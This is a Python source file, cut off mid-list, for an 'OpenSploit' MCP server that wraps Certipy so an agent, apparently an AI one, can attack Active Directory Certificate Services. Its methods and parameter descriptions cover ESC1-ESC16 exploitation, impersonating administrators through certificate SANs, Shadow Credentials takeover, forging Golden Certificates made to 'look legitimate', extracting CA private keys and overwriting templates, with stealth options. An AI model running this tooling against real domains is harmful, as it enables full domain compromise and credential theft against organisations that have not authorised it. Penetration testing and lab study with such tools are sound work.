#!/usr/bin/env python3
"""
OpenSploit MCP Server: certipy
Active Directory Certificate Services enumeration and exploitation via Certipy v5.0.4.

Wraps certipy-ad (pip: certipy-ad, CLI: certipy).
Subcommands: find, req, auth, shadow, forge, template, ca, account, cert, parse.
ESC1-ESC16 vulnerability detection and exploitation.
"""

import glob
import json
import os
import re
import shlex
import shutil
import uuid
from typing import Any, Dict, List, Optional, Set

import yaml

from mcp_common.base_server import BaseMCPServer, ToolResult, ToolError
from mcp_common.output_parsers import sanitize_output

# Certipy binary (pip install certipy-ad)
CERTIPY_BIN = "certipy"

# Output directory inside the container (session mount)
OUTPUT_DIR = "/session"
# Working directory for certipy output (avoids file collisions)
WORK_DIR = "/session/certipy"


CRED_DIR = "/session/credentials"
CONFIG_DIR = "/session/config"
RECIPE_DIR = "/session/tool_recipes/certipy"

# Auth params handled by _build_auth_args, not recipe flag mapping
CERTIPY_AUTH_PARAM_NAMES = {"username", "password", "hashes", "kerberos", "aes_key",
                            "ccache_path", "dc_ip", "ns", "dns_tcp", "target"}


class CertipyServer(BaseMCPServer):
    def __init__(self):
        super().__init__(
            name="certipy",
            description="AD Certificate Services enumeration and exploitation",
            version="1.0.0",
        )

        # Stateful credential tracking
        self._tickets: Dict[str, str] = {}  # identity -> ccache path
        self._certificates: Dict[str, str] = {}  # identity -> pfx path
        self._active_principal: Optional[str] = None
        self._krb5_configured: bool = False

        # Recipe tracking
        self._recipe_methods: Set[str] = set()
        self._recipe_file_mtimes: Dict[str, float] = {}

        # Restore state from /session/ on startup
        self._restore_state()

        self.register_method(
            name="find",
            description="Enumerate AD CS — discover CAs, templates, and ESC1-ESC16 vulnerabilities",
            params=self._find_params(),
            handler=self.find,
        )

        self.register_method(
            name="request",
            description="Request a certificate from a CA — exploit ESC1/2/3/6/9/10/15/16",
            params=self._request_params(),
            handler=self.request,
        )

        self.register_method(
            name="authenticate",
            description="Authenticate using a PFX certificate — PKINIT for TGT + NT hash",
            params=self._authenticate_params(),
            handler=self.authenticate,
        )

        self.register_method(
            name="shadow",
            description="Shadow Credentials attack — abuse msDS-KeyCredentialLink for account takeover",
            params=self._shadow_params(),
            handler=self.shadow,
        )

        self.register_method(
            name="forge",
            description="Forge certificates using compromised CA private key (Golden Certificate)",
            params=self._forge_params(),
            handler=self.forge,
        )

        self.register_method(
            name="template",
            description="View or modify AD certificate template configuration",
            params=self._template_params(),
            handler=self.template,
        )

        self.register_method(
            name="ca",
            description="Manage Certificate Authority: enable/disable templates, approve/deny certificate requests (ESC7)",
            params=self._ca_params(),
            handler=self.ca,
        )

        self.register_method(
            name="account",
            description="Create, read, update, or delete AD machine/user accounts for ADCS exploitation",
            params=self._account_params(),
            handler=self.account,
        )

        self.register_method(
            name="cert",
            description="Convert between certificate formats — extract PEM from PFX, combine key+cert into PFX, strip key or cert",
            params=self._cert_params(),
            handler=self.cert,
        )

        self.register_method(
            name="parse",
            description="Offline ADCS analysis — parse BOF output or registry exports without domain access",
            params=self._parse_params(),
            handler=self.parse,
        )

        # Load dynamic recipes from session
        self._load_recipes()

    # ── Dynamic Recipe System ────────────────────────────────────

    def _load_recipes(self):
        """Load recipe YAML files from /session/tool_recipes/certipy/."""
        if not os.path.isdir(RECIPE_DIR):
            return
        for path in sorted(glob.glob(os.path.join(RECIPE_DIR, "*.yaml"))) + \
                     sorted(glob.glob(os.path.join(RECIPE_DIR, "*.yml"))):
            try:
                mtime = os.path.getmtime(path)
                if self._recipe_file_mtimes.get(path) == mtime:
                    continue
                with open(path) as f:
                    recipe = yaml.safe_load(f)
                if not recipe or not recipe.get("name"):
                    continue
                name = recipe["name"]
                if name in self.methods and name not in self._recipe_methods:
                    self.logger.warning(f"Recipe '{name}' conflicts with built-in method, skipping")
                    continue
                self._register_recipe(name, recipe)
                self._recipe_file_mtimes[path] = mtime
                self.logger.info(f"Loaded recipe: {name}")
            except Exception as e:
                self.logger.warning(f"Recipe load failed {path}: {e}")

    def _maybe_reload_recipes(self):
        """Check for new or modified recipe files."""
        if not os.path.isdir(RECIPE_DIR):
            return
        current_files = set(
            glob.glob(os.path.join(RECIPE_DIR, "*.yaml")) +
            glob.glob(os.path.join(RECIPE_DIR, "*.yml"))
        )
        needs_reload = current_files != set(self._recipe_file_mtimes.keys())
        if not needs_reload:
            for path in current_files:
                try:
                    if os.path.getmtime(path) != self._recipe_file_mtimes.get(path):
                        needs_reload = True
                        break
                except OSError:
                    needs_reload = True
                    break
        if needs_reload:
            for path in set(self._recipe_file_mtimes.keys()) - current_files:
                del self._recipe_file_mtimes[path]
            self._load_recipes()

    def _register_recipe(self, name: str, recipe: Dict[str, Any]):
        """Register a dynamic recipe method with inherited auth params."""
        recipe_params = recipe.get("params", {})
        auth_style = recipe.get("auth", "target")

        extra = {
            "timeout": {"type": "integer", "default": 60, "description": "Timeout in seconds"},
            **{k: {"type": v.get("type", "string"),
                    "required": v.get("required", False),
                    "description": v.get("description", "")}
               for k, v in recipe_params.items() if k not in CERTIPY_AUTH_PARAM_NAMES}
        }

        if auth_style != "none":
            params = self._auth_params()
            params.update(extra)
        else:
            params = extra

        def make_handler(r):
            async def handler(**kw):
                return await self._run_recipe(r, **kw)
            return handler

        self.register_method(
            name=name,
            description=recipe.get("description", f"Dynamic method: {name}"),
            params=params,
            handler=make_handler(recipe),
        )
        self._recipe_methods.add(name)

    async def _run_recipe(self, recipe: Dict[str, Any], **kwargs) -> ToolResult:
        """Execute a dynamic recipe method using certipy auth builder."""
        timeout = kwargs.pop("timeout", 60)
        auth_style = recipe.get("auth", "target")

        # Extract certipy auth kwargs
        auth_kw = {k: kwargs.pop(k, None) for k in list(CERTIPY_AUTH_PARAM_NAMES) if k in kwargs}

        # Build command
        binary = recipe.get("binary", f"certipy {recipe['name']}")
        cmd = binary.split() if " " in binary else [binary]

        # Build auth args if recipe uses certipy auth
        if auth_style != "none":
            filtered = {k: v for k, v in auth_kw.items() if v is not None
                        and k in ("username", "dc_ip", "password", "hashes",
                                  "kerberos", "aes_key", "ns", "dns_tcp", "target")}
            if "username" in filtered and "dc_ip" in filtered:
                auth_args = self._build_auth_args(**filtered)
                cmd.extend(auth_args)

        # Translate recipe params to CLI flags
        recipe_params = recipe.get("params", {})
        for param_name, value in kwargs.items():
            if value is None:
                continue
            param_def = recipe_params.get(param_name, {})
            flag = param_def.get("flag", f"-{param_name.replace('_', '-')}")
            if not flag:
                cmd.append(str(value))
            elif param_def.get("type") == "boolean":
                if value:
                    cmd.append(flag)
            else:
                cmd.extend([flag, str(value)])

        # Build env for Kerberos
        env = {}
        ccache_path = auth_kw.get("ccache_path")
        kerberos = auth_kw.get("kerberos", False)
        if kerberos:
            env = self._get_auth_env(ccache_path=ccache_path)

        try:
            result = await self.run_command_with_progress(cmd, env=env)
            combined = result.stdout + result.stderr
            return ToolResult(
                success=result.returncode == 0,
                data={"command": " ".join(cmd), "method": recipe["name"]},
                raw_output=sanitize_output(combined),
            )
        except ToolError as e:
            return ToolResult(success=False, data={"method": recipe["name"]}, error=str(e))

    async def _handle_tool_call(self, name, arguments):
        """Override to check for new recipes before handling calls."""
        self._maybe_reload_recipes()
        return await super()._handle_tool_call(name, arguments)

    # ── State Management ─────────────────────────────────────────

    def _restore_state(self):
        """Restore credential state from /session/ on container start."""
        if os.path.isdir(CRED_DIR):
            for ccache in glob.glob(os.path.join(CRED_DIR, "*.ccache")):
                principal = os.path.splitext(os.path.basename(ccache))[0]
                self._tickets[principal] = ccache
                self._active_principal = principal
        # Also restore certificates from working directory
        for pfx in glob.glob(os.path.join(WORK_DIR, "*.pfx")):
            identity = os.path.splitext(os.path.basename(pfx))[0]
            self._certificates[identity] = pfx
        if os.path.exists(os.path.join(CONFIG_DIR, "krb5.conf")):
            if not os.path.exists("/etc/krb5.conf"):
                shutil.copy(os.path.join(CONFIG_DIR, "krb5.conf"), "/etc/krb5.conf")
            self._krb5_configured = True
        if self._tickets:
            self.logger.info(f"Restored {len(self._tickets)} tickets from {CRED_DIR}")

    def _save_ticket(self, principal: str, ccache_path: str):
        """Save a ticket to /session/credentials/ and track in memory."""
        os.makedirs(CRED_DIR, exist_ok=True)
        safe_name = principal.replace("/", "_").replace("@", "_").replace("\\", "_")
        dest = os.path.join(CRED_DIR, f"{safe_name}.ccache")
        shutil.copy2(ccache_path, dest)
        self._tickets[principal] = dest
        self._active_principal = principal
        self.logger.info(f"Saved ticket for {principal} -> {dest}")

    def _get_auth_env(self, principal: str = None, ccache_path: str = None) -> Dict[str, str]:
        """Get env dict with KRB5CCNAME for the given (or active) principal."""
        # Direct ccache_path takes priority
        if ccache_path and os.path.exists(ccache_path):
            return {"KRB5CCNAME": ccache_path}
        p = principal or self._active_principal
        if p:
            ccache = self._tickets.get(p)
            if ccache and os.path.exists(ccache):
                return {"KRB5CCNAME": ccache}
        return {}

    def _ensure_krb5_conf(self, dc_ip: str, username: str = None):
        """Auto-generate /etc/krb5.conf from username@domain format."""
        if self._krb5_configured:
            return
        # Extract domain from user@domain format
        domain = None
        if username and "@" in username:
            domain = username.split("@", 1)[1]
        if not domain:
            return
        realm = domain.upper()
        conf = f"""[libdefaults]
    default_realm = {realm}
    dns_lookup_realm = false
    dns_lookup_kdc = false
    forwardable = true

[realms]
    {realm} = {{
        kdc = {dc_ip}
        admin_server = {dc_ip}
    }}

[domain_realm]
    .{domain.lower()} = {realm}
    {domain.lower()} = {realm}
"""
        with open("/etc/krb5.conf", "w") as f:
            f.write(conf)
        os.makedirs(CONFIG_DIR, exist_ok=True)
        with open(os.path.join(CONFIG_DIR, "krb5.conf"), "w") as f:
            f.write(conf)
        self._krb5_configured = True
        self.logger.info(f"Generated krb5.conf for realm {realm} (KDC: {dc_ip})")

    # ── Parameter Definitions ──────────────────────────────────

    def _auth_params(self) -> Dict[str, Dict[str, Any]]:
        """Common AD authentication parameters for certipy."""
        return {
            "username": {
                "type": "string",
                "required": True,
                "description": "Username in user@domain format (e.g., 'attacker@corp.local'). Certipy requires the @domain suffix for LDAP operations.",
            },
            "password": {
                "type": "string",
                "description": "Password for authentication.",
            },
            "hashes": {
                "type": "string",
                "description": "NTLM hash for pass-the-hash authentication (e.g., 'aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0').",
            },
            "kerberos": {
                "type": "boolean",
                "default": False,
                "description": "Use Kerberos authentication from ccache file. When using Kerberos, also pass target with the DC FQDN (e.g., DC01.corp.local) for SPN resolution.",
            },
            "aes_key": {
                "type": "string",
                "description": "AES key for Kerberos auth (128 or 256 bit hex string).",
            },
            "ccache_path": {
                "type": "string",
                "description": "Path to Kerberos ccache file (e.g., /session/credentials/auditor.ccache). Used when kerberos=true.",
            },
            "dc_ip": {
                "type": "string",
                "required": True,
                "description": "Domain Controller IP address. Used for LDAP connection and DNS resolution (-dc-ip).",
            },
            "ns": {
                "type": "string",
                "description": "DNS nameserver IP for hostname resolution (-ns). Defaults to dc_ip if omitted.",
            },
            "dns_tcp": {
                "type": "boolean",
                "default": True,
                "description": "Use TCP for DNS queries. Enabled by default for Docker reliability.",
            },
            "target": {
                "type": "string",
                "description": "Target server hostname or IP. Required for Kerberos auth — use the DC FQDN (e.g., DC01.corp.local), not IP.",
            },
            "timeout": {
                "type": "integer",
                "default": 300,
                "description": "Maximum execution time in seconds.",
            },
        }

    def _build_auth_args(
        self,
        username: str,
        dc_ip: str,
        password: Optional[str] = None,
        hashes: Optional[str] = None,
        kerberos: bool = False,
        aes_key: Optional[str] = None,
        ns: Optional[str] = None,
        dns_tcp: bool = True,
        target: Optional[str] = None,
    ) -> List[str]:
        """Build common certipy auth CLI arguments."""
        # Auto-generate krb5.conf if using Kerberos
        if kerberos:
            self._ensure_krb5_conf(dc_ip, username)

        args = ["-username", username, "-dc-ip", dc_ip]

        if password:
            args.extend(["-password", password])
        if hashes:
            args.extend(["-hashes", hashes])
        if kerberos:
            args.append("-k")
        if aes_key:
            args.extend(["-aes", aes_key])
        if not password and not hashes and not kerberos and not aes_key:
            args.append("-no-pass")

        # DNS nameserver — default to dc_ip
        effective_ns = ns or dc_ip
        args.extend(["-ns", effective_ns])

        if dns_tcp:
            args.append("-dns-tcp")

        if target:
            args.extend(["-target", target])
            if kerberos:
                # Kerberos also needs -dc-host for SPN resolution
                args.extend(["-dc-host", target])

        return args

    def _find_params(self) -> Dict[str, Dict[str, Any]]:
        """Parameters for the find method."""
        params = self._auth_params()
        params.update({
            "vulnerable": {
                "type": "boolean",
                "default": False,
                "description": "Only show vulnerable certificate templates and CAs. Filters output to ESC1-ESC16 findings only.",
            },
            "enabled": {
                "type": "boolean",
                "default": False,
                "description": "Only show enabled certificate templates. Reduces noise from disabled templates.",
            },
            "dc_only": {
                "type": "boolean",
                "default": False,
                "description": "Only collect data from the Domain Controller (LDAP queries only, no host contact). Stealthier.",
            },
            "stdout": {
                "type": "boolean",
                "default": False,
                "description": "Print text summary to stdout instead of writing to file.",
            },
            "user_sid": {
                "type": "string",
                "description": "User SID for accurate vulnerability assessment. If omitted, certipy uses the authenticated user's SID.",
            },
            "oids": {
                "type": "boolean",
                "default": False,
                "description": "Show issuance policy OIDs for each template. Useful for ESC13/ESC15 analysis.",
            },
            "connection_timeout": {
                "type": "integer",
                "description": "Per-connection timeout in seconds (certipy -timeout). Controls LDAP/RPC connection timeout, NOT overall execution timeout.",
            },
            "extra_args": {
                "type": "string",
                "description": "Additional certipy find flags appended to the command (e.g., '-scheme ldap -port 389'). Flags are split by whitespace and appended safely.",
            },
        })
        return params

    def _request_params(self) -> Dict[str, Dict[str, Any]]:
        """Parameters for the request method."""
        params = self._auth_params()
        params.update({
            "ca": {
                "type": "string",
                "required": True,
                "description": "Certificate Authority name (e.g., 'CORP-CA'). Get CA names from 'find' method output.",
            },
            "template": {
                "type": "string",
                "default": "User",
                "description": "Certificate template name (case-sensitive, e.g., 'User', 'Machine', 'WebServer'). Get template names from 'find' method.",
            },
            "upn": {
                "type": "string",
                "description": "User Principal Name for Subject Alternative Name (ESC1). Set to target user UPN to impersonate (e.g., 'administrator@corp.local').",
            },
            "dns": {
                "type": "string",
                "description": "DNS hostname for SAN. Used for machine account impersonation (e.g., 'dc01.corp.local').",
            },
            "sid": {
                "type": "string",
                "description": "Object SID for SAN. Required for StrongCertificateBindingEnforcement=2 environments.",
            },
            "target": {
                "type": "string",
                "description": "CA server hostname or IP. If omitted, certipy resolves CA hostname via LDAP.",
            },
            "on_behalf_of": {
                "type": "string",
                "description": "Request certificate on behalf of another user (ESC3). Format: 'DOMAIN\\\\user' (e.g., 'CORP\\\\Administrator'). Requires enrollment agent PFX via pfx_path.",
            },
            "pfx_path": {
                "type": "string",
                "description": "Path to existing PFX file for enrollment agent requests (ESC3 -on-behalf-of) or certificate renewal. Must be under /session/.",
            },
            "retrieve": {
                "type": "integer",
                "description": "Retrieve a previously issued certificate by request ID (ESC7 workflow). Use after ca -issue-request approves a pending request.",
            },
            "key_size": {
                "type": "integer",
                "default": 2048,
                "description": "RSA key size in bits. Default 2048. Increase to 4096 for stronger keys.",
            },
            "web": {
                "type": "boolean",
                "default": False,
                "description": "Use Web Enrollment (HTTP) instead of RPC. Required when only Web Enrollment is available (ESC8 related).",
            },
            "application_policies": {
                "type": "string",
                "description": "Application policy OIDs to include in CSR (ESC15/EKUwu). Comma-separated OIDs.",
            },
            "dcom": {
                "type": "boolean",
                "default": False,
                "description": "Use DCOM transport for certificate request. Workaround for RPC_E_CALL_COMPLETE errors.",
            },
            "subject": {
                "type": "string",
                "description": "Certificate subject DN override (e.g., 'CN=Administrator'). Used in ESC9/ESC10 exploitation.",
            },
            "pfx_password": {
                "type": "string",
                "description": "Password for enrollment agent PFX file (ESC3). Use when the PFX file is password-protected.",
            },
            "renew": {
                "type": "boolean",
                "default": False,
                "description": "Renew an existing certificate instead of requesting a new one.",
            },
            "connection_timeout": {
                "type": "integer",
                "description": "Per-connection timeout in seconds (certipy -timeout). Controls RPC/LDAP connection timeout, NOT overall execution timeout.",
            },
            "extra_args": {
                "type": "string",
                "description": "Additional certipy req flags appended to the command (e.g., '-scheme ldap'). Flags are split by whitespace and appended safely.",
            },
        })
        return params

    def _authenticate_params(self) -> Dict[str, Dict[str, Any]]:
        """Parameters for the authenticate method."""
        return {
            "pfx_path": {
                "type": "string",
                "required": True,
                "description": "Path to PFX/P12 certificate file (e.g., '/session/certipy/administrator.pfx'). Obtained from 'request' or 'forge' methods.",
            },
            "pfx_password": {
                "type": "string",
                "description": "Password for the PFX file. Usually empty for certipy-generated PFX files.",
            },
            "dc_ip": {
                "type": "string",
                "required": True,
                "description": "Domain Controller IP for Kerberos PKINIT authentication.",
            },
            "domain": {
                "type": "string",
                "description": "Domain name override. Usually extracted from the certificate automatically.",
            },
            "kirbi": {
                "type": "boolean",
                "default": False,
                "description": "Save TGT in Kirbi format (.kirbi) instead of ccache (.ccache). Useful for Windows tools.",
            },
            "no_hash": {
                "type": "boolean",
                "default": False,
                "description": "Skip requesting NT hash via U2U. Only get the TGT.",
            },
            "ldap_shell": {
                "type": "boolean",
                "default": False,
                "description": "Start LDAP shell after authentication. NOT recommended for MCP (interactive). Use for Schannel auth only.",
            },
            "username": {
                "type": "string",
                "description": "Username override for authentication. Use when the certificate has no UPN embedded (e.g., machine certificates).",
            },
            "ns": {
                "type": "string",
                "description": "DNS nameserver IP for hostname resolution. Use when container DNS cannot resolve the DC hostname.",
            },
            "dns_tcp": {
                "type": "boolean",
                "default": False,
                "description": "Use TCP for DNS queries during authentication. Useful for Docker reliability.",
            },
            "timeout": {
                "type": "integer",
                "default": 120,
                "description": "Maximum execution time in seconds.",
            },
            "extra_args": {
                "type": "string",
                "description": "Additional certipy auth flags appended to the command (e.g., '-ldap-shell'). Flags are split by whitespace and appended safely.",
            },
        }

    def _shadow_params(self) -> Dict[str, Dict[str, Any]]:
        """Parameters for the shadow method."""
        params = self._auth_params()
        params.update({
            "account": {
                "type": "string",
                "required": True,
                "description": "Target account SAM name to attack (e.g., 'administrator'). Attacker must have write access to target's msDS-KeyCredentialLink attribute.",
            },
            "action": {
                "type": "enum",
                "values": ["auto", "list", "add", "remove", "clear", "info"],
                "default": "auto",
                "description": "Shadow credential action. 'auto' = add credential, authenticate, get NT hash, then remove credential. 'list' = show existing key credentials. 'add' = add only. 'remove' = remove specific device ID. 'clear' = remove all key credentials. 'info' = show details of specific key credential.",
            },
            "device_id": {
                "type": "string",
                "description": "Device ID UUID for 'remove' or 'info' actions. Get IDs from 'list' action.",
            },
            "extra_args": {
                "type": "string",
                "description": "Additional certipy shadow flags appended to the command. Flags are split by whitespace and appended safely.",
            },
        })
        return params

    def _forge_params(self) -> Dict[str, Dict[str, Any]]:
        """Parameters for the forge method."""
        return {
            "ca_pfx": {
                "type": "string",
                "required": True,
                "description": "Path to CA certificate + private key PFX (e.g., '/session/certipy/CORP-CA.pfx'). Obtained from 'ca -backup' or ESC5 exploitation.",
            },
            "ca_password": {
                "type": "string",
                "description": "Password for the CA PFX file.",
            },
            "upn": {
                "type": "string",
                "description": "User Principal Name for the forged certificate (e.g., 'administrator@corp.local').",
            },
            "dns": {
                "type": "string",
                "description": "DNS hostname for forged certificate (e.g., 'dc01.corp.local'). Use for machine account impersonation.",
            },
            "sid": {
                "type": "string",
                "description": "Object SID to embed in forged certificate. Required for StrongCertificateBindingEnforcement=2.",
            },
            "subject": {
                "type": "string",
                "description": "Certificate subject DN (e.g., 'CN=Administrator,CN=Users,DC=corp,DC=local').",
            },
            "crl": {
                "type": "string",
                "description": "CRL distribution point URL (e.g., 'ldap:///'). Include to make forged cert look legitimate.",
            },
            "serial": {
                "type": "string",
                "description": "Custom serial number for the forged certificate.",
            },
            "key_size": {
                "type": "integer",
                "default": 2048,
                "description": "RSA key size for the forged certificate.",
            },
            "validity_period": {
                "type": "integer",
                "default": 365,
                "description": "Validity period in days.",
            },
            "timeout": {
                "type": "integer",
                "default": 120,
                "description": "Maximum execution time in seconds.",
            },
            "extra_args": {
                "type": "string",
                "description": "Additional certipy forge flags appended to the command (e.g., '-issuer CN=CA'). Flags are split by whitespace and appended safely.",
            },
        }

    def _ca_params(self) -> Dict[str, Dict[str, Any]]:
        """Parameters for the ca method."""
        params = self._auth_params()
        params.update({
            "ca_name": {
                "type": "string",
                "required": True,
                "description": "Certificate Authority name (e.g., 'pirate-DC01-CA'). Get from 'find' method output.",
            },
            "enable_template": {
                "type": "string",
                "description": "Template name to enable on the CA.",
            },
            "disable_template": {
                "type": "string",
                "description": "Template name to disable on the CA.",
            },
            "issue_request": {
                "type": "integer",
                "description": "Request ID to approve/issue (for pending certificate requests).",
            },
            "deny_request": {
                "type": "integer",
                "description": "Request ID to deny.",
            },
            "add_officer": {
                "type": "string",
                "description": "Add a user as CA officer (ManageCertificates right). Used in ESC7 exploitation to grant certificate issuance permissions.",
            },
            "remove_officer": {
                "type": "string",
                "description": "Remove a user as CA officer. Used for ESC7 cleanup after exploitation.",
            },
            "backup": {
                "type": "boolean",
                "default": False,
                "description": "Extract CA private key and certificate (ESC5/golden certificate). Requires ManageCA rights. Use -config to specify CA.",
            },
            "config": {
                "type": "string",
                "description": "CA configuration string in 'Machine\\\\CAName' format (e.g., 'DC01\\\\CORP-CA'). Required with -backup to specify which CA to extract.",
            },
            "list_templates": {
                "type": "boolean",
                "default": False,
                "description": "List all certificate templates published on the CA.",
            },
            "extra_args": {
                "type": "string",
                "description": "Additional certipy ca flags appended to the command. Flags are split by whitespace and appended safely.",
            },
        })
        return params

    def _template_params(self) -> Dict[str, Dict[str, Any]]:
        """Parameters for the template method."""
        params = self._auth_params()
        params.update({
            "template": {
                "type": "string",
                "required": True,
                "description": "Certificate template name (case-sensitive, e.g., 'User', 'WebServer'). Get names from 'find' method.",
            },
            "action": {
                "type": "enum",
                "values": ["read", "save_config", "write_default", "write_config"],
                "default": "read",
                "description": "Template action. 'read' = display template properties. 'save_config' = save current config to JSON for backup. 'write_default' = overwrite with ESC1-vulnerable default (ESC4 exploitation). 'write_config' = restore config from JSON file.",
            },
            "config_path": {
                "type": "string",
                "description": "Path to template configuration JSON file. Required for 'write_config' action. Use config saved by 'save_config' action.",
            },
            "extra_args": {
                "type": "string",
                "description": "Additional certipy template flags appended to the command. Flags are split by whitespace and appended safely.",
            },
        })
        return params

    def _account_params(self) -> Dict[str, Dict[str, Any]]:
        """Parameters for the account method."""
        params = self._auth_params()
        params.update({
            "action": {
                "type": "enum",
                "values": ["create", "read", "update", "delete"],
                "default": "read",
                "description": "Account action. 'create' = create new machine/user account. 'read' = view account properties. 'update' = modify account attributes. 'delete' = remove account.",
            },
            "user": {
                "type": "string",
                "required": True,
                "description": "SAM account name of the target account to create/read/update/delete (e.g., 'FAKE01$' for machine, 'newuser' for user).",
            },
            "group": {
                "type": "string",
                "description": "Group DN to add the account to (e.g., 'CN=Computers,DC=corp,DC=local'). Defaults to CN=Computers container.",
            },
            "account_dns": {
                "type": "string",
                "description": "DNS hostname for the account (e.g., 'FAKE01.corp.local'). Used with create/update.",
            },
            "upn": {
                "type": "string",
                "description": "User Principal Name for the account (e.g., 'fake01@corp.local').",
            },
            "sam": {
                "type": "string",
                "description": "Override SAM account name (e.g., 'FAKE01$').",
            },
            "spns": {
                "type": "string",
                "description": "Service Principal Names, comma-separated (e.g., 'HOST/FAKE01.corp.local').",
            },
            "account_pass": {
                "type": "string",
                "description": "Password for the target account (create/update).",
            },
            "extra_args": {
                "type": "string",
                "description": "Additional certipy account flags appended to the command (e.g., '-no-ldap-channel-binding'). Flags are split by whitespace and appended safely.",
            },
        })
        return params

    def _cert_params(self) -> Dict[str, Dict[str, Any]]:
        """Parameters for the cert method."""
        return {
            "pfx_path": {
                "type": "string",
                "description": "Input PFX/P12 file path (e.g., '/session/certipy/admin.pfx').",
            },
            "pfx_password": {
                "type": "string",
                "description": "Password for the input PFX/P12 file.",
            },
            "key_path": {
                "type": "string",
                "description": "Input private key file (PEM or DER format).",
            },
            "cert_path": {
                "type": "string",
                "description": "Input certificate file (PEM or DER format).",
            },
            "export": {
                "type": "boolean",
                "default": False,
                "description": "Export to PFX/P12 format. Use to combine separate key + cert files into a PFX.",
            },
            "out": {
                "type": "string",
                "description": "Output filename (e.g., '/session/certipy/converted.pem'). If omitted, certipy auto-generates.",
            },
            "nocert": {
                "type": "boolean",
                "default": False,
                "description": "Exclude certificate from output (key only).",
            },
            "nokey": {
                "type": "boolean",
                "default": False,
                "description": "Exclude private key from output (certificate only).",
            },
            "export_password": {
                "type": "string",
                "description": "Password to protect the output PFX/P12 file.",
            },
            "timeout": {
                "type": "integer",
                "default": 60,
                "description": "Maximum execution time in seconds.",
            },
            "extra_args": {
                "type": "string",
                "description": "Additional certipy cert flags appended to the command. Flags are split by whitespace and appended safely.",
            },
        }

    def _parse_params(self) -> Dict[str, Dict[str, Any]]:
        """Parameters for the parse method."""
        return {
            "input_file": {
                "type": "string",
                "required": True,
                "description": "Path to file to parse (BOF output or .reg file from registry export).",
            },
            "format": {
                "type": "enum",
                "values": ["bof", "reg"],
                "default": "bof",
                "description": "Input file format: 'bof' (Beacon Object File output) or 'reg' (Windows .reg registry export).",
            },
            "domain": {
                "type": "string",
                "description": "Domain name for output context (e.g., 'corp.local'). Only used in labels, not for queries.",
            },
            "ca_name": {
                "type": "string",
                "description": "CA name for output context. Only used in labels.",
            },
            "sids": {
                "type": "string",
                "description": "Comma-separated SIDs to consider as owned for vulnerability assessment.",
            },
            "published": {
                "type": "string",
                "description": "Comma-separated template names to consider as published in AD.",
            },
            "vulnerable": {
                "type": "boolean",
                "default": False,
                "description": "Only show vulnerable certificate templates.",
            },
            "enabled": {
                "type": "boolean",
                "default": False,
                "description": "Only show enabled certificate templates.",
            },
            "hide_admins": {
                "type": "boolean",
                "default": False,
                "description": "Hide administrator permissions in output.",
            },
            "output_stdout": {
                "type": "boolean",
                "default": False,
                "description": "Print results to stdout instead of file.",
            },
            "timeout": {
                "type": "integer",
                "default": 120,
                "description": "Maximum execution time in seconds.",
            },
            "extra_args": {
                "type": "string",
                "description": "Additional certipy parse flags appended to the command. Flags are split by whitespace and appended safely.",
            },
        }

    # ── Helpers ─────────────────────────────────────────────────

    def _ensure_work_dir(self):
        """Ensure the certipy working directory exists and chdir into it."""
        os.makedirs(WORK_DIR, exist_ok=True)
        os.chdir(WORK_DIR)

    def _unique_prefix(self) -> str:
        """Generate a unique prefix to avoid file collisions."""
        return uuid.uuid4().hex[:8]

    def _find_new_files(self, before_files: set) -> List[str]:
        """Find files created in WORK_DIR since before_files snapshot."""
        current = set()
        for f in glob.glob(os.path.join(WORK_DIR, "*")):
            current.add(f)
        new_files = sorted(current - before_files)
        return new_files

    def _snapshot_files(self) -> set:
        """Snapshot current files in WORK_DIR."""
        return set(glob.glob(os.path.join(WORK_DIR, "*")))

    def _detect_certipy_error(self, combined_output: str) -> Optional[str]:
        """Detect certipy error patterns in combined stdout+stderr.

        Certipy often exits with code 0 even on failure (e.g., auth errors,
        connection failures). This method inspects the output for known error
        patterns and returns an error message if one is found, or None if the
        output looks clean.
        """
        error_patterns = [
            # Authentication errors
            (r"\[-\]\s*LDAP NTLM authentication failed", "LDAP authentication failed"),
            (r"\[-\]\s*Got error:\s*Kerberos authentication failed", "Kerberos authentication failed"),
            (r"\[-\]\s*NTLM negotiate failed", "Kerberos authentication failed (NTLM negotiate failed)"),
            (r"\[-\]\s*Error during Kerberos authentication", "Kerberos authentication error"),
            (r"\[-\]\s*Got error:\s*No credentials provided", "No credentials provided for TGT request"),
            # Clock skew
            (r"KRB_AP_ERR_SKEW", "Clock skew too great for Kerberos authentication"),
            # KDC errors
            (r"\[-\]\s*Kerberos error:.*KDC_ERR", "Kerberos KDC error"),
            # Connection errors
            (r"\[-\]\s*Got error:\s*socket connection error", "Connection error (socket timeout)"),
            (r"\[-\]\s*Got error:\s*Failed to get DCE RPC connection", "Failed to establish RPC connection"),
            (r"\[-\]\s*Got error:\s*Could not connect", "Connection failed"),
            (r"\[-\]\s*Failed to connect to.*endpoint mapper", "Failed to connect to endpoint mapper"),
            (r"\[-\]\s*Failed to connect to LDAP server", "Failed to connect to LDAP server"),
            # Certificate errors
            (r"\[-\]\s*Certificate is not valid for client authentication", "Certificate not valid for client authentication"),
            (r"\[-\]\s*Failed to request certificate", "Certificate request failed"),
            (r"CERTSRV_E_TEMPLATE_DENIED", "Template enrollment permission denied (CERTSRV_E_TEMPLATE_DENIED)"),
            (r"CERTSRV_E_UNSUPPORTED_CERT_TYPE", "Unsupported certificate template (CERTSRV_E_UNSUPPORTED_CERT_TYPE)"),
            (r"CERTSRV_E_RESTRICTEDOFFICER", "Enrollment agent restrictions apply (CERTSRV_E_RESTRICTEDOFFICER)"),
            (r"CERTSRV_E_NO_EMAIL_DN", "No email in subject DN (CERTSRV_E_NO_EMAIL_DN)"),
            (r"CERTSRV_E", "Certificate Services error"),
            # RPC errors
            (r"\[-\]\s*Got error:\s*RPC_E_CALL_COMPLETE", "RPC call already complete (RPC_E_CALL_COMPLETE) -- try -dcom flag"),
            (r"rpc_s_access_denied", "RPC access denied"),
            # Permission / access errors
            (r"\[-\]\s*Could not update Key Credentials.*insufficient access rights", "Insufficient access rights to modify msDS-KeyCredentialLink"),
            (r"\[-\]\s*Could not update Key Credentials", "Failed to update Key Credentials"),
            # Identity errors
            (r"\[-\]\s*Username or domain is not specified.*identity information was not found", "No identity information in certificate -- specify -username and -domain"),
            # Config errors
            (r"\[-\]\s*Configuration file not found", "Configuration file not found"),
            # CA management errors
            (r"\[-\]\s*Access denied:", "Access denied on CA operation"),
            (r"\[-\]\s*No action specified", "No action specified for CA management"),
            (r"\[-\]\s*Failed to connect to Service Control Manager", "Failed to connect to Service Control Manager (backup requires admin)"),
            # Account management errors
